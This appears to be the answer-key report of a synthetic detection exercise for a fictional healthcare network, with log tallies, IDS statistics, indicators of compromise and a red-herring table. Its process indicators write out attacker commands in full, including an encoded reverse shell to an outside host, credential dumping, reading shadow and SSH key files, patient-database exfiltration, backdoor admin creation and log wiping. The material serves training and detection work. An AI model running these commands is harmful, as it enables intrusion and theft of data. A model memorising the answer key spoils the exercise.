| bd708479-71a2-4dea-83c8-538c8f53fbd9 | ids | delayed: 2 |
| bf32b3f4-ccca-4eb3-85ce-fb24e308c2a3 | ids | delayed: 1 |
| c0b06fd2-45ba-4d1f-9623-d7c94a9489d5 | ids | delayed: 1 |
| c10e1fd1-0706-46a1-be09-84f7097ae9e8 | ids | delayed: 2 |
| c1509283-6ec4-4faf-85d2-c54d457cc4f1 | ids | delayed: 1 |
| c4a54de2-757a-4f4d-9d26-9a972e0a9dd5 | ids | delayed: 1 |
| c552e16d-6a69-4dde-87dc-e0c04c2399fa | ids | delayed: 2 |
| c7871ec0-a50b-4fac-886d-6ec03df280ed | ids | delayed: 1 |
| c7c31226-fef1-457e-af83-af465f560514 | ids | delayed: 1 |
| c885791d-841a-45ad-9f6d-a4b167c38038 | ids | delayed: 1 |
| c9f956cf-01fa-41a7-a2c8-c2c7c1ca0488 | ids | delayed: 2 |
| cd70a3a7-9dd6-4ae7-8fc5-4139a521cb9c | ids | delayed: 1 |
| ce63684a-20dd-40bd-a967-53f05b3ba0f2 | ids | delayed: 1 |
| d0e92a43-f357-4bb6-b7b2-a47b4dcfdef8 | ids | delayed: 1 |
| d1134d63-538e-4acb-9d25-85df74575ead | ids | delayed: 1 |
| d67a1d55-aa01-420c-bcad-595688d79a3a | ids | delayed: 2 |
| d84fc741-e836-41c3-9a2e-d3075ad89233 | ids | delayed: 1 |
| dbf775ab-5844-49c8-94fa-9b23ef58c101 | ids | delayed: 1 |
| deb933df-412c-44d5-9e2f-91ee28da4cef | ids | delayed: 1 |
| df3cee5b-f487-474c-825b-877b5e1f4478 | ids | delayed: 1 |
| e04702ed-0d8c-4c24-b40a-f25d5f18f58d | ids | delayed: 1 |
| e197bf7d-2a9b-4863-809a-177c1e6efce7 | ids | delayed: 1 |
| e4b69782-6437-407c-8484-17aac19c37a3 | ids | delayed: 1 |
| e53c74cd-ee63-41d6-8a76-1b813dac8191 | ids | delayed: 1 |
| ea508673-0912-4a7c-bd64-9b20cfc918d3 | ids | delayed: 1 |
| ea90d24d-87fe-442d-8dfc-dd5a88aa23d0 | ids | delayed: 1 |
| ebe8a71a-c18f-44fe-bc9f-fdf84df983b7 | ids | delayed: 1 |
| evt-001 | asa | delayed: 6 |
| evt-001 | ecar | delayed: 2 |
| evt-001 | ids | filtered: 1 |
| evt-001 | web | delayed: 1 |
| evt-001 | zeek | delayed: 6, filtered: 4 |
| evt-002 | asa | delayed: 384, dropped: 1, filtered: 1, visible: 3 |
| evt-002 | ecar | delayed: 384, dropped: 5 |
| evt-002 | ids | delayed: 13, visible: 1 |
| evt-002 | web | delayed: 341 |
| evt-002 | zeek | delayed: 494, dropped: 2, filtered: 2, visible: 233 |
| evt-003 | syslog | delayed: 3 |
| evt-003 | zeek | delayed: 2 |
| evt-004 | asa | delayed: 2 |
| evt-004 | ecar | delayed: 2 |
| evt-004 | web | delayed: 2 |
| evt-004 | zeek | delayed: 4 |
| evt-005 | asa | delayed: 2 |
| evt-005 | ecar | delayed: 4 |
| evt-005 | syslog | visible: 1 |
| evt-005 | web | delayed: 1 |
| evt-005 | zeek | delayed: 3 |
| evt-006 | asa | delayed: 31 |
| evt-006 | bash_history | visible: 7 |
| evt-006 | ecar | delayed: 52, dropped: 1 |
| evt-006 | syslog | delayed: 9 |
| evt-006 | windows_security | delayed: 2 |
| evt-006 | zeek | delayed: 26, visible: 5 |
| evt-007 | bash_history | visible: 3 |
| evt-007 | ecar | delayed: 6 |
| evt-008 | asa | delayed: 3, filtered: 1 |
| evt-008 | bash_history | visible: 1 |
| evt-008 | ecar | delayed: 9 |
| evt-008 | ids | delayed: 2 |
| evt-008 | syslog | delayed: 4 |
| evt-008 | windows_security | delayed: 2 |
| evt-008 | zeek | delayed: 5, visible: 1 |
| evt-009 | bash_history | visible: 2 |
| evt-009 | ecar | delayed: 4 |
| evt-010 | ecar | delayed: 8 |
| evt-010 | sysmon | delayed: 8 |
| evt-010 | windows_security | delayed: 2 |
| evt-011 | ecar | delayed: 1 |
| evt-011 | syslog | delayed: 1 |
| evt-011 | windows_security | delayed: 1 |
| evt-012 | asa | delayed: 3, filtered: 5 |
| evt-012 | ecar | delayed: 12, dropped: 1 |
| evt-012 | sysmon | delayed: 2 |
| evt-012 | windows_security | delayed: 19 |
| evt-012 | zeek | delayed: 7, visible: 2 |
| evt-013 | asa | delayed: 2, filtered: 1 |
| evt-013 | ecar | delayed: 41 |
| evt-013 | sysmon | delayed: 38 |
| evt-013 | windows_security | delayed: 14 |
| evt-013 | zeek | delayed: 3, visible: 1 |
| evt-014 | ecar | delayed: 13 |
| evt-014 | sysmon | delayed: 13 |
| evt-014 | windows_security | delayed: 2 |
| evt-015 | asa | delayed: 3 |
| evt-015 | ecar | delayed: 23 |
| evt-015 | sysmon | delayed: 21 |
| evt-015 | windows_security | delayed: 11 |
| evt-015 | zeek | delayed: 3, visible: 1 |
| evt-016 | ecar | delayed: 34 |
| evt-016 | sysmon | delayed: 34 |
| evt-016 | windows_security | delayed: 10 |
| evt-017 | asa | filtered: 2 |
| evt-017 | ecar | delayed: 32 |
| evt-017 | sysmon | delayed: 31 |
| evt-017 | windows_security | delayed: 11 |
| evt-017 | zeek | delayed: 1, visible: 2 |
| evt-018 | asa | delayed: 28, visible: 2 |
| evt-018 | ecar | delayed: 36, dropped: 2 |
| evt-018 | proxy | delayed: 10 |
| evt-018 | sysmon | delayed: 18 |
| evt-018 | windows_security | delayed: 20 |
| evt-018 | zeek | delayed: 62, visible: 14 |
| evt-019 | asa | delayed: 3, out_of_window: 1 |
| evt-019 | ecar | delayed: 3, out_of_window: 1 |
| evt-019 | proxy | delayed: 3, out_of_window: 1 |
| evt-019 | sysmon | delayed: 3, out_of_window: 1 |
| evt-019 | zeek | delayed: 2, out_of_window: 2, visible: 4 |
| evt-020 | asa | delayed: 26, filtered: 311 |
| evt-020 | ecar | delayed: 336, dropped: 1 |
| evt-020 | ids | delayed: 6, dropped: 1, filtered: 294 |
| evt-020 | sysmon | delayed: 14 |
| evt-020 | windows_security | delayed: 348, visible: 2 |
| evt-020 | zeek | delayed: 483, dropped: 1, filtered: 2, visible: 188 |
| evt-021 | asa | delayed: 90, visible: 1 |
| evt-021 | ecar | delayed: 89, dropped: 2 |
| evt-021 | ids | delayed: 16, filtered: 164, visible: 2 |
| evt-021 | windows_security | delayed: 89, visible: 2 |
| evt-021 | zeek | delayed: 142, visible: 40 |
| evt-022 | asa | delayed: 1, visible: 1 |
| evt-022 | ecar | delayed: 27 |
| evt-022 | sysmon | delayed: 26 |
| evt-022 | windows_security | delayed: 12 |
| evt-022 | zeek | delayed: 1, visible: 1 |
| evt-023 | asa | filtered: 4 |
| evt-023 | bash_history | visible: 11 |
| evt-023 | ecar | delayed: 36 |
| evt-023 | syslog | delayed: 10 |
| evt-023 | windows_security | delayed: 2 |
| evt-023 | zeek | delayed: 2, visible: 4 |
| evt-024 | windows_security | delayed: 1 |
| evt-025 | asa | delayed: 3 |
| evt-025 | ecar | delayed: 32 |
| evt-025 | proxy | delayed: 1 |
| evt-025 | sysmon | delayed: 28 |
| evt-025 | windows_security | delayed: 8 |
| evt-025 | zeek | delayed: 4, visible: 4 |
| evt-026 | asa | delayed: 3, filtered: 3 |
| evt-026 | ecar | delayed: 7 |
| evt-026 | proxy | delayed: 3 |
| evt-026 | zeek | delayed: 14, visible: 4 |
| evt-027 | ecar | delayed: 1 |
| evt-027 | windows_security | delayed: 2 |
| evt-028 | bash_history | visible: 1 |
| evt-028 | ecar | delayed: 2 |
| evt-029 | bash_history | visible: 1 |
| evt-029 | ecar | delayed: 3 |
| evt-030 | asa | delayed: 2 |
| evt-030 | ecar | delayed: 16, dropped: 11 |
| evt-030 | proxy | delayed: 1 |
| evt-030 | sysmon | delayed: 26 |
| evt-030 | windows_security | delayed: 7 |
| evt-030 | zeek | delayed: 6 |
| evt-031 | asa | filtered: 3 |
| evt-031 | ecar | delayed: 3 |
| evt-031 | windows_security | delayed: 3 |
| evt-031 | zeek | delayed: 2, visible: 4 |
| evt-032 | ecar | delayed: 18 |
| evt-032 | sysmon | delayed: 18 |
| evt-032 | windows_security | delayed: 4 |
| evt-033 | ecar | delayed: 10 |
| evt-033 | sysmon | delayed: 9 |
| evt-033 | windows_security | delayed: 9, visible: 1 |
| evt-034 | ecar | delayed: 2 |
| evt-034 | sysmon | delayed: 1 |
| evt-034 | windows_security | delayed: 2 |
| evt-035 | ecar | delayed: 2 |
| evt-035 | syslog | delayed: 2 |
| evt-email-001 | all | out_of_window: 1 |
| evt-email-001 | asa | delayed: 8, filtered: 3 |
| evt-email-001 | ecar | delayed: 15 |
| evt-email-001 | proxy | delayed: 2 |
| evt-email-001 | syslog | delayed: 10 |
| evt-email-001 | sysmon | delayed: 6 |
| evt-email-001 | windows_security | delayed: 7 |
| evt-email-001 | zeek | delayed: 19, visible: 5 |
| evt-email-002 | asa | delayed: 3 |
| evt-email-002 | ecar | delayed: 4 |
| evt-email-002 | proxy | delayed: 1 |
| evt-email-002 | sysmon | delayed: 2 |
| evt-email-002 | windows_security | delayed: 2 |
| evt-email-002 | zeek | delayed: 4, visible: 2 |
| evt-email-003 | asa | delayed: 8, filtered: 2 |
| evt-email-003 | ecar | delayed: 39, dropped: 1 |
| evt-email-003 | syslog | delayed: 14 |
| evt-email-003 | sysmon | delayed: 39 |
| evt-email-003 | windows_security | delayed: 18, visible: 1 |
| evt-email-003 | zeek | delayed: 24 |
| evt-email-004 | all | out_of_window: 8 |
| evt-email-004 | asa | delayed: 9, dropped: 1, filtered: 2 |
| evt-email-004 | ecar | delayed: 18 |
| evt-email-004 | syslog | delayed: 20 |
| evt-email-004 | sysmon | delayed: 4 |
| evt-email-004 | windows_security | delayed: 8, visible: 1 |
| evt-email-004 | zeek | delayed: 28, visible: 2 |
| evt-email-005 | asa | delayed: 2 |
| evt-email-005 | ecar | delayed: 2 |
| evt-email-005 | syslog | delayed: 2 |
| evt-email-005 | windows_security | delayed: 1 |
| evt-email-005 | zeek | delayed: 6 |
| evt-email-006 | asa | delayed: 3 |
| evt-email-006 | ecar | delayed: 6 |
| evt-email-006 | syslog | delayed: 8 |
| evt-email-006 | sysmon | delayed: 5 |
| evt-email-006 | windows_security | delayed: 3 |
| evt-email-006 | zeek | delayed: 7, visible: 2 |
| evt-email-007 | asa | delayed: 7, filtered: 1 |
| evt-email-007 | ecar | delayed: 13 |
| evt-email-007 | syslog | delayed: 9 |
| evt-email-007 | windows_security | delayed: 5 |
| evt-email-007 | zeek | delayed: 17, visible: 7 |
| evt-email-008 | asa | delayed: 5, filtered: 2 |
| evt-email-008 | ecar | delayed: 41, dropped: 2 |
| evt-email-008 | proxy | delayed: 2 |
| evt-email-008 | syslog | delayed: 11 |
| evt-email-008 | sysmon | delayed: 39 |
| evt-email-008 | windows_security | delayed: 8 |
| evt-email-008 | zeek | delayed: 9, visible: 9 |
| evt-email-009 | asa | delayed: 1 |
| evt-email-009 | ecar | delayed: 1 |
| evt-email-009 | syslog | delayed: 2 |
| evt-email-009 | sysmon | delayed: 1 |
| evt-email-009 | windows_security | delayed: 1 |
| evt-email-009 | zeek | delayed: 2 |
| evt-email-010 | asa | delayed: 1 |
| evt-email-010 | ecar | delayed: 1 |
| evt-email-010 | syslog | delayed: 2 |
| evt-email-010 | zeek | delayed: 5 |
| evt-email-011 | asa | delayed: 6, filtered: 2 |
| evt-email-011 | ecar | delayed: 11 |
| evt-email-011 | proxy | delayed: 1 |
| evt-email-011 | syslog | delayed: 9 |
| evt-email-011 | sysmon | delayed: 7 |
| evt-email-011 | windows_security | delayed: 7 |
| evt-email-011 | zeek | delayed: 21, visible: 2 |
| f18cdfbc-1583-46e4-9831-58c8c6a29a35 | ids | delayed: 1 |
| f2bb1a89-b57d-4e52-b716-166eb9971910 | ids | delayed: 1 |
| f8519f55-4154-4d27-bb52-2a2dc813bb21 | ids | delayed: 1 |
| f9cd3fda-fd45-431d-8f91-510e53678a6a | ids | delayed: 2 |
| fa82b543-20df-4943-9f3f-2622d449263b | ids | filtered: 1 |
| fc35d95a-a33f-48cf-9400-3085db1f4cf9 | ids | delayed: 1 |
| fc82929c-0aa0-4da1-b3e8-939950194c3a | ids | delayed: 2 |
| red_herring:rh-001 | ecar | delayed: 4 |
| red_herring:rh-001 | windows_security | delayed: 4 |
| red_herring:rh-002 | asa | delayed: 1 |
| red_herring:rh-002 | ecar | delayed: 33 |
| red_herring:rh-002 | sysmon | delayed: 32 |
| red_herring:rh-002 | windows_security | delayed: 7 |
| red_herring:rh-002 | zeek | delayed: 1 |
| red_herring:rh-003 | asa | delayed: 4 |
| red_herring:rh-003 | ecar | delayed: 7 |
| red_herring:rh-003 | ids | delayed: 1 |
| red_herring:rh-003 | proxy | delayed: 1 |
| red_herring:rh-003 | windows_security | delayed: 2 |
| red_herring:rh-003 | zeek | delayed: 2, visible: 6 |


## IDS Evaluation Summary

Observation totals: delayed=207, dropped=1, filtered=460, visible=6.

| Sensor | GID:SID | Candidates | Emitted | Policy Filtered | Origins | Digest |
|--------|---------|------------|---------|-----------------|---------|--------|
| snort-core | 1:2000334 | 3 | 3 | 0 | built_in=3 | `b9242a49af55` |
| snort-core | 1:2000357 | 2 | 2 | 0 | built_in=2 | `ea8b301a2ed4` |
| snort-core | 1:2000560 | 4 | 4 | 0 | built_in=4 | `d87479478280` |
| snort-core | 1:2002911 | 1 | 1 | 0 | authored_attachment=1 | `e36e50c2cb7d` |
| snort-core | 1:2003068 | 1 | 1 | 0 | built_in=1 | `2fc9e7f18ef5` |
| snort-core | 1:2016149 | 2 | 2 | 0 | built_in=2 | `aa771a8b967d` |
| snort-core | 1:2024291 | 5 | 5 | 0 | built_in=5 | `3b0b526ace4b` |
| snort-core | 1:2024392 | 1 | 1 | 0 | built_in=1 | `14dc7d23145f` |
| snort-core | 1:2027757 | 15 | 15 | 0 | built_in=15 | `4184c7918111` |
| snort-core | 1:2027863 | 3 | 3 | 0 | built_in=3 | `4d46449e07f2` |
| snort-core | 1:2027865 | 99 | 17 | 82 | authored_attachment=9, built_in=8 | `aaa341b545bc` |
| snort-core | 1:2029706 | 310 | 16 | 294 | authored_attachment=6, built_in=10 | `c0b89a5a4a5e` |
| snort-perimeter | 1:2000334 | 2 | 2 | 0 | built_in=2 | `642279e0f7dc` |
| snort-perimeter | 1:2000575 | 9 | 9 | 0 | built_in=9 | `506cbb22c2e7` |
| snort-perimeter | 1:2002910 | 15 | 14 | 1 | built_in=14 | `ba88517be3d2` |
| snort-perimeter | 1:2002911 | 1 | 1 | 0 | authored_attachment=1 | `6287aef3474a` |
| snort-perimeter | 1:2003068 | 6 | 6 | 0 | built_in=6 | `a66b923588e2` |
| snort-perimeter | 1:2010935 | 4 | 4 | 0 | built_in=4 | `3d9ef7328e53` |
| snort-perimeter | 1:2013028 | 3 | 3 | 0 | built_in=3 | `222f54860467` |
| snort-perimeter | 1:2013504 | 7 | 7 | 0 | authored_attachment=1, built_in=6 | `ae3ba638e23f` |
| snort-perimeter | 1:2016149 | 4 | 4 | 0 | built_in=4 | `e92e1a8c31f9` |
| snort-perimeter | 1:2018959 | 2 | 2 | 0 | built_in=2 | `98fc48af53b8` |
| snort-perimeter | 1:2022476 | 4 | 4 | 0 | built_in=4 | `61bc7af72d44` |
| snort-perimeter | 1:2023672 | 7 | 7 | 0 | built_in=7 | `c3c7b3e8e2eb` |
| snort-perimeter | 1:2023882 | 5 | 5 | 0 | built_in=5 | `4d2e717177fe` |
| snort-perimeter | 1:2024290 | 2 | 2 | 0 | built_in=2 | `f8f2516eda60` |
| snort-perimeter | 1:2024291 | 4 | 4 | 0 | built_in=4 | `ce8b83375f1f` |
| snort-perimeter | 1:2024392 | 2 | 2 | 0 | built_in=2 | `45766b3ae3e3` |
| snort-perimeter | 1:2024897 | 3 | 3 | 0 | built_in=3 | `8e7b7595e7a1` |
| snort-perimeter | 1:2025712 | 4 | 4 | 0 | built_in=4 | `45a7c01c9da2` |
| snort-perimeter | 1:2025991 | 3 | 3 | 0 | built_in=3 | `2d2686785e5d` |
| snort-perimeter | 1:2027316 | 3 | 3 | 0 | built_in=3 | `00d2497dfb0b` |
| snort-perimeter | 1:2027757 | 11 | 11 | 0 | built_in=11 | `59daed8e1b74` |
| snort-perimeter | 1:2027863 | 3 | 3 | 0 | built_in=3 | `011ca6b11f9b` |
| snort-perimeter | 1:2027865 | 97 | 15 | 82 | authored_attachment=9, built_in=6 | `3461c5d19406` |
| snort-perimeter | 1:2028401 | 4 | 4 | 0 | built_in=4 | `50fd0236992b` |
| snort-perimeter | 1:2029706 | 6 | 6 | 0 | built_in=6 | `bf046a4977f8` |
| snort-perimeter | 1:366 | 6 | 6 | 0 | built_in=6 | `e3cee95cae1a` |
| snort-perimeter | 1:382 | 5 | 5 | 0 | built_in=5 | `93ea79d16a82` |
| snort-perimeter | 1:384 | 4 | 4 | 0 | built_in=4 | `f845720eecbd` |


## Indicators of Compromise (IOCs)

### Network IOCs

- 10.10.1.35 (Attacker IP)
- 10.10.1.35:3389 (Lateral Movement)
- 10.10.1.99 (Attacker IP)
- 10.10.2.10:389 (Internal Server)
- 10.10.2.30:22 (Lateral Movement)
- 10.10.3.10:443 (Web Scan Target)
- 10.10.3.20:22 (Internal Server)
- 10.10.4.10:22 (Lateral Movement)
- 203.14.220.10:443 (C2 Server)
- 2j3rhpi2329sn.top (DGA Domain)
- 30rgw6r7503.top (DGA Domain)
- 45.33.32.30:443 (Beacon Target)
- 45.33.32.30:443 (C2 Server)
- 45.33.32.30:443 (Denied Beacon Target)
- 45.33.32.30:8443 (C2 Server)
- 6cja6syvo02mu.top (DGA Domain)
- DC-01.meridianhcs.local (Malicious DNS Query)
- Message-ID: <100000I9EMNA.1000OREDIL@meridianhcs.com>
- Message-ID: <1000016ONZTK.10015EDCND@meridianhcs.com>
- Message-ID: <121609FF-AFF2-1350-BCEC-8A52032BE7D0@meridianhcs.com>
- Message-ID: <1486572785.976919.3e76dbd7@meridianhcs.com>
- Message-ID: <1746897100.499514.89c6aefa@meridianhcs.com>
- Message-ID: <billing-a1f65b41-3807664@medclaims-processing.net>
- Message-ID: <notices-b9dac45a-8235363@benefits-serviceportal.com>
- Message-ID: <workspace-e2b1dcaf-9440641@docflow-health.net>
- Port 22 (scan target)
- Port 3306 (scan target)
- Port 443 (scan target)
- Port 80 (scan target)
- Port 8080 (scan target)
- Port 8443 (scan target)
- SMTP Zeek UID: C0q8UgTfESa3gxnoWsZ
- SMTP Zeek UID: C2kcCUnFFHQQPI9BDbx
- SMTP Zeek UID: C6BRTz1BFGpEHDWkcx
- SMTP Zeek UID: CLisWQThHfOBumIRqi
- SMTP Zeek UID: CNyj6wuJatIiu7T7zf
- SMTP Zeek UID: COqJANW3riFJrQ482NC
- SMTP Zeek UID: CU4XGk3N3CIgyIv3dF
- SMTP Zeek UID: CaL0ADqJTgsM59klevG
- SMTP Zeek UID: CbUBAHwyaATj24kE8s
- SMTP Zeek UID: Ch04G2LSx919AVunmu
- SMTP Zeek UID: CqSQDjUK9y5pQtFb75
- SMTP Zeek UID: CrjdPhN8Bpg4rYUjpOE
- SMTP Zeek UID: Cu7oIjBN071o35tFup
- SMTP Zeek UID: Cz3fpsTM09Khe627lS
- SMTP Zeek UID: CzEPGsOTqRdjGC8OlNn
- Zeek UID: C5QQ2X3DD506ysbiOG
- Zeek UID: C9dVf2EOore2d33nFw
- Zeek UID: CCuuFOmnneynbWpBb
- Zeek UID: CD513QpuOsom9oiLVy
- Zeek UID: CDGVXLGtcepDh8Clz
- Zeek UID: CGl03UeWDhZ9rRroxu7
- Zeek UID: CIu9sBFbxrMEKB2Cra
- Zeek UID: CTxzqQ9C7v5RN9k8Ef
- Zeek UID: CzP4UGBXkeXkJKJWXv
- Zeek UID: CzXo2HWT5uiSEQt3v0V
- api.westbridge-services.net (Malicious DNS Query)
- edge.westbridge-services.net (Malicious DNS Query)
- ewnjsaqf1rasgez5.top (DGA Domain)
- metrics.westbridge-services.net (Malicious DNS Query)
- ns1.westbridge-services.cloud (DNS Tunnel Endpoint)
- qrdqtp5nhn66chp00.top (DGA Domain)

### Process IOCs

- /bin/bash
- /usr/bin/cat
- /usr/bin/find
- /usr/bin/gzip
- /usr/bin/ls
- /usr/bin/mysqldump
- /usr/bin/nmap
- /usr/bin/scp
- /usr/bin/shred
- /usr/sbin/ip
- C:\Windows\System32\PSEXESVC.exe
- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- C:\Windows\System32\cmd.exe
- C:\Windows\System32\ms-index-service.exe
- C:\Windows\System32\net.exe
- C:\Windows\System32\sc.exe
- C:\Windows\System32\schtasks.exe
- C:\Windows\System32\wevtutil.exe
- C:\Windows\System32\whoami.exe
- Injection Target: C:\Windows\System32\lsass.exe
- Scheduled Task: \Microsoft\Windows\Maintenance\DeviceSync
- Service: DeviceSyncSvc
- Service: PSEXESVC
- `PSEXESVC.exe -accepteula`
- `bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC80NS4zMy4zMi4zMC84NDQzIDA+JjEi | base64 -d | bash'`
- `cat /etc/hosts`
- `cat /etc/passwd`
- `cat /etc/resolv.conf`
- `cat /etc/shadow`
- `cat /root/.ssh/id_rsa`
- `cat /var/www/html/config.php`
- `cmd.exe /c whoami && hostname`
- `find /opt/ehr -name '*credential*' -maxdepth 3`
- `gzip -9 /tmp/rpt_0318.sql`
- `history -c && cat /dev/null > ~/.bash_history`
- `ip addr show`
- `ls -la /root/.ssh`
- `ms-index-service.exe "privilege::debug" "sekurlsa::logonpasswords" exit`
- `mysqldump --single-transaction ehr patients insurance_claims > /tmp/rpt_0318.sql`
- `net group "Domain Admins" /domain`
- `net group "Domain Admins" svc_mhsync /add /domain`
- `net user /domain`
- `net user svc_mhsync /delete /domain`
- `net user svc_mhsync MhsSvc!2024 /add /domain`
- `net view /domain`
- `net view \\FILE-SRV-01`
- `nmap -sT -p 22,80,443,445,3306 10.10.2.0/24`
- `nmap -sn 10.10.2.0/24`
- `powershell.exe -NoProfile -Command "Compress-Archive -Path \\FILE-SRV-01\Finance\Q1\*,\\FILE-SRV-01\Patients\Exports\* -DestinationPath C:\ProgramData\Microsoft\cache_7f3a.zip"`
- `powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBhAHAAaQAuAHcAZQBzAHQAYgByAGkAZABnAGUALQBzAGUAcgB2AGkAYwBlAHMALgBuAGUAdAAvAHYAMgAvAG0AYQBuAGkAZgBlAHMAdAAiACkA`
- `sc.exe create DeviceSyncSvc binPath= C:\Windows\System32\DeviceSyncSvc.exe obj= LocalSystem start= auto`
- `schtasks.exe /Create /TN "\Microsoft\Windows\Maintenance\DeviceSync" /SC HOURLY /TR "C:\Windows\System32\DeviceSyncSvc.exe" /RU SYSTEM`
- `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/.cache/rpt_0318.sql.gz`
- `shred -u /root/.bash_history`
- `wevtutil cl Security`
- `whoami /all`

### User IOCs

- Group: Domain Admins (compromised account)
- SYSTEM (compromised account)
- aisha.johnson (compromised account)
- aisha.johnson (Spray Target) (compromised account)
- apache (compromised account)
- diego.ramirez (compromised account)
- diego.ramirez (Spray Target) (compromised account)
- evelyn.brooks (compromised account)
- lina.nguyen (compromised account)
- marcus.chen (compromised account)
- marcus.chen (Explicit Credential Target) (compromised account)
- omar.haddad (compromised account)
- priya.patel (compromised account)
- root (compromised account)
- sophia.martinez (Spray Target) (compromised account)
- svc_mhsync (compromised account)

### File IOCs

- %SystemRoot%\PSEXESVC.exe
- /root/.bash_history
- /tmp/rpt_0318.sql
- C:\Windows\System32\DeviceSyncSvc.exe
- artifacts/email/benefits-confirmation-msg.eml
- artifacts/email/docflow-ai-summary-msg.eml
- artifacts/email/ehr-release-note-msg.eml
- artifacts/email/executive-operating-note-msg.eml
- artifacts/email/finance-forward-to-it-msg.eml
- artifacts/email/internal-reset-lure-msg.eml
- artifacts/email/vendor-interface-package-msg.eml


## Red Herrings

The following events appear suspicious but are benign. They are included to make the dataset more realistic.

| Timestamp | Actor | System | Activity | Why It's Benign |
|-----------|-------|--------|----------|-----------------|
| 2024-03-18 13:04:58 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:05:00 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:05:08 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:05:09 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 14:04:39 UTC | lina.nguyen | WS-LNGUYEN-01 | Developer refreshes Ubuntu package metadata from the public archive | Routine package maintenance uses the APT HTTP user agent and triggers a low-priority policy alert. |
| 2024-03-18 17:10:05 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
| 2024-03-18 17:10:13 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
| 2024-03-18 17:10:14 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
